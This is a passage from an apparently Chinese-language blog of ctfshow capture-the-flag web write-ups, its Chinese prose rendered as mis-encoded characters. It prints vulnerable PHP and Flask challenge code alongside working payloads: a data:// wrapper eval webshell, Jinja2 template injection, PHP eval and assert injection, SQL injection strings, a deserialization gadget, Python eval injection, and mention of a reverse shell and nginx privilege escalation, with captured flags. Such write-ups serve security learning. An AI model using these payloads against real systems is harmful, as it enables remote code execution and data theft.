<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$name</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">&#x27;select pass from user where name=&quot;&#x27;</span>.<span class="variable">$name</span>.<span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$sql</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;4rfvbgt56yhn.sh&#x27;</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$name</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;admin!!!!!&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">            <span class="title function_ invoke__">preg_replace_callback</span>(<span class="string">&quot;/\w\W*/&quot;</span>,function()&#123;<span class="keyword">die</span>(<span class="string">&quot;not allowed!&quot;</span>);&#125;,<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>],<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you not admin&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\d : æ•°å­—ã€‚  \D : é™¤äº†æ•°å­—ã€‚</span><br><span class="line">\w : æ•°å­—ï¼Œå­—æ¯ï¼Œä¸‹åˆ’çº¿ã€‚\W : é™¤äº†æ•°å­—ï¼Œå­—æ¯ï¼Œä¸‹åˆ’çº¿ã€‚</span><br><span class="line">\s  : ç©ºç™½ç¬¦ ã€‚ \S : é™¤äº†ç©ºç™½ç¬¦  ã€‚</span><br></pre></td></tr></table></figure>



<p>æ³¨å†Œä¸€ä¸ªä¸€ä¸ªè´¦å·</p>
<p>è´¦å· adminç©ºæ ¼</p>
<p> å¯†ç éšæ„ï¼›ç™»å½•ï¼Œä»–æŠŠæ‰€æœ‰å­—ç¬¦éƒ½è¿‡æ»¤äº†ï¼Œé‚£ä¸ç©¿å°±è¡Œäº†</p>
<p>payloadï¼šindex.php?c&#x3D;</p>
<h1 id="å•èº«æ¯"><a href="#å•èº«æ¯" class="headerlink" title="å•èº«æ¯"></a>å•èº«æ¯</h1><h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$file</span>)==<span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>strrevï¼Œå­—ç¬¦åè½¬å‡½æ•°?&gt;ï¼Œè¿›è¡Œé—­åˆï¼Œåé¢ä¸å½±å“</p>
<p>ä¼ªåè®®è¯»å–ï¼Œ</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file=data://text/plain,&lt;?php eval($_POST[1]);?&gt;&gt;?;)]1[TSOP_$(lave php?&lt;,nialp/txet//:atad&amp;1=system(&#x27;cat /f1agaaa&#x27;);</span><br></pre></td></tr></table></figure>

<h2 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å­¦ä¹ ä¸¤ä¸ªæ–°çš„å‘½ä»¤</p>
<p>sed</p>
<p>awk</p>
<h1 id="å†…éƒ¨èµ›"><a href="#å†…éƒ¨èµ›" class="headerlink" title="å†…éƒ¨èµ›"></a>å†…éƒ¨èµ›</h1><h2 id="å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯-jpg"><a href="#å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯-jpg" class="headerlink" title="å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯.jpg"></a>å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯.jpg</h2><p>æ‰“å¼€èšå‰‘è¿æ¥å¯†ç æ˜¯caiï¼Œè¿æ¥ååå¼¹shellï¼Œæ ¹æ®æç¤ºæŸ¥çœ‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<p> è¿™ä¸ªæ–‡ä»¶æ”¾ä¸€äº›å®šæ—¶ä»»åŠ¡</p>
<p><img src="/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/QQ%E6%88%AA%E5%9B%BE20230807224959.png"></p>
<p>nginx æœ¬åœ°ææƒ</p>
<h2 id="è“ç˜¦"><a href="#è“ç˜¦" class="headerlink" title="è“ç˜¦"></a>è“ç˜¦</h2><p>æŸ¥çœ‹æºç ï¼Œå¯ä»¥çœ‹åˆ°key param</p>
<p>flask session ä¼ªé€ ,ç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="ç­¾é€€"><a href="#ç­¾é€€" class="headerlink" title="ç­¾é€€"></a>ç­¾é€€</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=a;system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=a=system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>



<h2 id="ç™»å½•å°±æœ‰flag"><a href="#ç™»å½•å°±æœ‰flag" class="headerlink" title="ç™»å½•å°±æœ‰flag"></a>ç™»å½•å°±æœ‰flag</h2><p>åˆ†å·å¯ä»¥ç”¨äºé—­åˆï¼Œäº•å·å¯ä»¥ç”¨äºæ³¨é‡Šï¼Œ^è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œç­‰å·å°±æ˜¯åˆ¤ç­‰ï¼Œè¿™é‡Œéœ€è¦åˆ©ç”¨sqlçš„ä¸€ä¸ªç‚¹â€œmysqlå¼±ç±»å‹è½¬æ¢â€ï¼Œ<strong>ç©ºå¼‚æˆ–0ä¼šæŸ¥åˆ°æ‰€æœ‰éæ•°å­—å¼€å¤´çš„è®°å½•</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;^0#</span><br><span class="line">&#x27;^&#x27;&#x27;#</span><br></pre></td></tr></table></figure>

<h1 id="WEB-AKèµ›"><a href="#WEB-AKèµ›" class="headerlink" title="WEB AKèµ›"></a>WEB AKèµ›</h1><h2 id="web1-è§‚å­—"><a href="#web1-è§‚å­—" class="headerlink" title="web1_è§‚å­—"></a>web1_è§‚å­—</h2>]]></content>
  </entry>
  <entry>
    <title>ctfshow_web_èœç‹—æ¯</title>
    <url>/2023/01/08/ctfshow%E5%90%88%E9%9B%86-ctfshow-web-%E8%8F%9C%E7%8B%97%E6%9D%AF/</url>
    <content><![CDATA[<p>  æˆ‘æ˜¯èœç‹—</p>
 <span id="more"></span>

<h2 id="webç­¾åˆ°"><a href="#webç­¾åˆ°" class="headerlink" title="webç­¾åˆ°"></a>webç­¾åˆ°</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQç¾¤:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]);</span><br></pre></td></tr></table></figure>

<p>åŠ å…¥cookieä¸­ä¼ å…¥<code>CTFshow-QQç¾¤:=a</code>é‚£ä¹ˆå°±ä¼šå‡ºç°<code>$_POST[&#39;a&#39;]</code>ï¼Œå‡å¦‚postä¼ å…¥çš„å€¼ä¸º<code>a=b</code>ï¼Œé‚£ä¹ˆå°±ä¼šå¾—åˆ°<code>$_GET[&#39;b&#39;]</code>ï¼Œæ¥ç€å‡å¦‚getä¼ å…¥<code>b=c</code>å°±ä¼šå¾—åˆ°&#96;$_REQUEST[â€˜câ€™]</p>
<p><code>?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;ls /&quot;);</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">`<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="variable">$_GET</span>[<span class="variable">$_POST</span>[<span class="variable">$_COOKIE</span>[<span class="string">&#x27;CTFshow-QQç¾¤:&#x27;</span>]]]][<span class="number">6</span>][<span class="number">0</span>][<span class="number">7</span>][<span class="number">5</span>][<span class="number">8</span>][<span class="number">0</span>][<span class="number">9</span>][<span class="number">4</span>][<span class="number">4</span>]); `bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr <span class="keyword">var</span></span><br></pre></td></tr></table></figure>

<p><code>http://b931900e-462b-453b-9822-8631dc625e3e.challenge.ctf.show/?b=c&amp;c[0]=1&amp;c[6][0][7][5][8][0][9][4][4]=system(&quot;tac /f1a*&quot;);</code></p>
<p>ctfshow{c41273bb-5a71-44b9-9dc2-a9eaba87804d}</p>
<h2 id="æˆ‘çš„çœ¼é‡Œåªæœ‰"><a href="#æˆ‘çš„çœ¼é‡Œåªæœ‰" class="headerlink" title="æˆ‘çš„çœ¼é‡Œåªæœ‰$"></a>æˆ‘çš„çœ¼é‡Œåªæœ‰$</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>playload:</p>
<p><code>_=a1&amp;a1=a2&amp;a2=a3&amp;a3=a4&amp;a4=a5&amp;a5=a6&amp;a6=a7&amp;a7=a8&amp;a8=a9&amp;a9=a10&amp;a10=a11&amp;a11=a12&amp;a12=a15&amp;a15=a16&amp;a16=a17&amp;a17=a18&amp;a18=a19&amp;a19=a20&amp;a20=a21&amp;a21=a22&amp;a22=a23&amp;a23=a24&amp;a24=a25&amp;a25=a26&amp;a26=a27&amp;a27=a28&amp;a28=a29&amp;a29=a30&amp;a30=a31&amp;a31=a32&amp;a32=a33&amp;a33=a34&amp;a34=a35&amp;a35=a36&amp;a36=a37&amp;a37=system(&#39;ls /&#39;);</code></p>
<p><code>bin dev etc f1agaaa home lib media mnt proc root run sbin srv sys tmp usr var &lt;?php</code></p>
<p><code>=system(&#39;cat /f*&#39;);</code></p>
<p><code>ctfshow&#123;e1b2ed6c-fbb8-4c73-876e-ec6a41950797&#125;</code></p>
<h2 id="ä¸€è¨€æ—¢å‡º"><a href="#ä¸€è¨€æ—¢å‡º" class="headerlink" title="ä¸€è¨€æ—¢å‡º"></a>ä¸€è¨€æ—¢å‡º</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>playload: <code>?num=114514);//</code></p>
<p>å°±ä¼šæ‰§è¡Œé‡Œé¢çš„å†…å®¹ç„¶åæ³¨é‡Šæ‰äº†åé¢çš„å…¨éƒ¨å†…å®¹ï¼Œè¾“å‡ºflag</p>
<p>è§£æ³•2ï¼š<code>?num=114514%2B1805296</code></p>
<p>ctfshow{10bbb32b-baae-4704-9238-8a6df82ec55a}</p>
<h2 id="é©·é©¬éš¾è¿½"><a href="#é©·é©¬éš¾è¿½" class="headerlink" title="é©·é©¬éš¾è¿½"></a>é©·é©¬éš¾è¿½</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>; </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>] == <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">       <span class="title function_ invoke__">assert</span>(<span class="string">&quot;intval(<span class="subst">$_GET</span>[num])==1919810&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;ä¸€è¨€æ—¢å‡ºï¼Œé©·é©¬éš¾è¿½!&quot;</span>);</span><br><span class="line">       <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">   &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]|\;|\(|\)/&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è§£æ³•äºŒä¾æ—§èƒ½ç”¨<code>?num=114514%2B1805296</code></p>
<p>ctfshow{59e5ece8-747c-41d3-a711-e1634f0b26f9}</p>
<h2 id="TapTapTap"><a href="#TapTapTap" class="headerlink" title="TapTapTap"></a>TapTapTap</h2><p>æ‰“å¼€åæ˜¯ä¸€ä¸ªå¾—åˆ†å°æ¸¸æˆ</p>
<p>æ£€æŸ¥æºç åœ¨æœ€åå‘ç°jsæºç ï¼Œæ‰“å¼€æºç </p>
<p>base64è§£ç åYour flag is in &#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>è®¿é—®&#x2F;secret_path_you_do_not_know&#x2F;secretfile.txt</p>
<p>å¾—åˆ°ctfshow{91469515-6436-482e-8d01-bb4899c3675d}</p>
<h2 id="Webshell"><a href="#Webshell" class="headerlink" title="Webshell"></a>Webshell</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">    error_reporting(0);</span><br><span class="line"></span><br><span class="line">    class Webshell &#123;</span><br><span class="line">        public $cmd = &#x27;echo &quot;Hello World!&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $this-&gt;init();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function init() &#123;</span><br><span class="line">            if (!preg_match(&#x27;/flag/i&#x27;, $this-&gt;cmd)) &#123;</span><br><span class="line">                $this-&gt;exec($this-&gt;cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public function exec($cmd) &#123;</span><br><span class="line">            $result = shell_exec($cmd);</span><br><span class="line">            echo $result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(isset($_GET[&#x27;cmd&#x27;])) &#123;</span><br><span class="line">        $serializecmd = $_GET[&#x27;cmd&#x27;];</span><br><span class="line">        $unserializecmd = unserialize($serializecmd);</span><br><span class="line">        $unserializecmd-&gt;init();</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        highlight_file(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Webshell</span><br><span class="line">&#123;</span><br><span class="line">    public $cmd = &#x27;cat f*&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new Webshell;</span><br><span class="line">echo(serialize($a));</span><br></pre></td></tr></table></figure>



<h2 id="åŒ–é›¶ä¸ºæ•´"><a href="#åŒ–é›¶ä¸ºæ•´" class="headerlink" title="åŒ–é›¶ä¸ºæ•´"></a>åŒ–é›¶ä¸ºæ•´</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_GET</span>[<span class="variable">$i</span>])&gt;<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä½ å¤ªé•¿äº†ï¼ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$result</span>=<span class="variable">$result</span>.<span class="variable">$_GET</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$result</span> ===<span class="string">&quot;å¤§ç‰›&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¾ªç¯è¾“å…¥iï¼Œä¸­æ–‡åœ¨phpé‡Œé¢é•¿åº¦æ˜¯3ï¼Œå…¶å®å¾ˆå®¹æ˜“æƒ³åˆ°ä¸­æ–‡çš„urlç¼–ç å°±æ˜¯3ä¸ª</p>
<p>%E5%A4%A7%E7%89%9B</p>
<p>payload</p>
<p><code>1=%E5&amp;2=%A4&amp;3=%A7&amp;4=%E7&amp;5=%89&amp;6=%9B</code></p>
<h2 id="æ— ä¸€å¹¸å…"><a href="#æ— ä¸€å¹¸å…" class="headerlink" title="æ— ä¸€å¹¸å…"></a>æ— ä¸€å¹¸å…</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$arr</span>[<span class="variable">$_GET</span>[<span class="string">&#x27;0&#x27;</span>]]=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$arr</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;nonono!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$arr[$_GET[â€˜0â€™]]&#x3D;1;,å˜é‡arrèµ‹å€¼ä¸º1ï¼›å§‹ç»ˆä¸ºtrue,éšä¾¿ç»™0èµ‹å€¼</p>
<p>payload:0&#x3D;1</p>
<p>ctfshow{8b9aed50-afa2-4988-8181-89bcf3547acb}</p>
<h2 id="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"><a href="#ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰" class="headerlink" title="ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰"></a>ä¼ è¯´ä¹‹ä¸‹ï¼ˆé›¾ï¼‰</h2><p>é¢˜ç›®è¦æ±‚å¾—åˆ°2077åˆ†æ•°<br>æ‰€ä»¥æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°jsä»£ç æ³„éœ²<br>ctrl+f æœç´¢scoreè¿™ä¸ªå•è¯æ˜¯çŒœçš„ï¼Œå‘ç°ä»£ç <br>ç”±+1æ”¹ä¸º2077ï¼Œctrl+s ä¿å­˜ï¼Œåƒä¸€ä¸ªè‹¹æœï¼Œæ²¡å‡ºæ¥ï¼Œåˆåƒä¸€ä¸ªè‹¹æœï¼Œåœ¨æ§åˆ¶å°å‘ç°flag<br>ctfshow{Under0ph1di4n_n0!_â€¦underrrrrta1e}</p>
<h2 id="ç®—åŠ›è¶…ç¾¤"><a href="#ç®—åŠ›è¶…ç¾¤" class="headerlink" title="ç®—åŠ›è¶…ç¾¤"></a>ç®—åŠ›è¶…ç¾¤</h2><p>æŠ“åŒ…æŸ¥çœ‹å†…å®¹ä¼ é€’ä¸‰ä¸ªå‚æ•°ï¼Œéšä¾¿ç©¿ä¸€ä¸ª</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_calculate?number1=7&amp;operator=*&amp;number2=asdf</span><br></pre></td></tr></table></figure>

<p>å‡ºç°æŠ¥é”™</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_calculate?number1=&amp;operator=&amp;number2=__import__(%27os%27).popen(%27cat%20/f*%27).read()</span><br></pre></td></tr></table></figure>

<p>æºç å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># @Time    : 2022/11/2</span><br><span class="line"># @Author  : æ¢å§¬</span><br><span class="line"># @Forkfrom:https://github.com/helloflask/calculator</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">from flask import Flask, jsonify, render_template, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/_calculate&#x27;)</span><br><span class="line">def calculate():</span><br><span class="line">    a = request.args.get(&#x27;number1&#x27;, &#x27;0&#x27;)</span><br><span class="line">    operator = request.args.get(&#x27;operator&#x27;, &#x27;+&#x27;)</span><br><span class="line">    b = request.args.get(&#x27;number2&#x27;, &#x27;0&#x27;)</span><br><span class="line"></span><br><span class="line">    m = re.match(r&#x27;^\-?\d*[.]?\d*$&#x27;, a)</span><br><span class="line">    n = re.match(r&#x27;^\-?\d*[.]?\d*$&#x27;, a)</span><br><span class="line"></span><br><span class="line">    if m is None or n is None or operator not in &#x27;+-*/&#x27;:</span><br><span class="line">        return jsonify(result=&#x27;Error!&#x27;)</span><br><span class="line"></span><br><span class="line">    if operator == &#x27;/&#x27;:</span><br><span class="line">        result = eval(a + operator + str(float(b)))</span><br><span class="line">    else:</span><br><span class="line">        result = eval(a + operator + b)</span><br><span class="line">    return jsonify(result=result)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/hint&#x27;)</span><br><span class="line">def hint():</span><br><span class="line">    return render_template(&#x27;hint.html&#x27;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>



<h2 id="ç®—åŠ›å‡çº§"><a href="#ç®—åŠ›å‡çº§" class="headerlink" title="ç®—åŠ›å‡çº§"></a>ç®—åŠ›å‡çº§</h2><p>ä¸å¤ªæ‡‚</p>
<h2 id="éåœ°é£˜é›¶"><a href="#éåœ°é£˜é›¶" class="headerlink" title="éåœ°é£˜é›¶"></a>éåœ°é£˜é›¶</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$zeros=&quot;000000000000000000000000000000&quot;;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $key =&gt; $value)&#123;</span><br><span class="line">    $$key=$$value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($flag==&quot;000000000000000000000000000000&quot;)&#123;</span><br><span class="line">    echo &quot;å¥½å¤šé›¶&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;æ²¡æœ‰é›¶ï¼Œä»”ç»†çœ‹çœ‹è¾“å…¥æœ‰ä»€ä¹ˆé—®é¢˜å§&quot;;</span><br><span class="line">    var_dump($_GET);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?_GET=flag</span><br></pre></td></tr></table></figure>

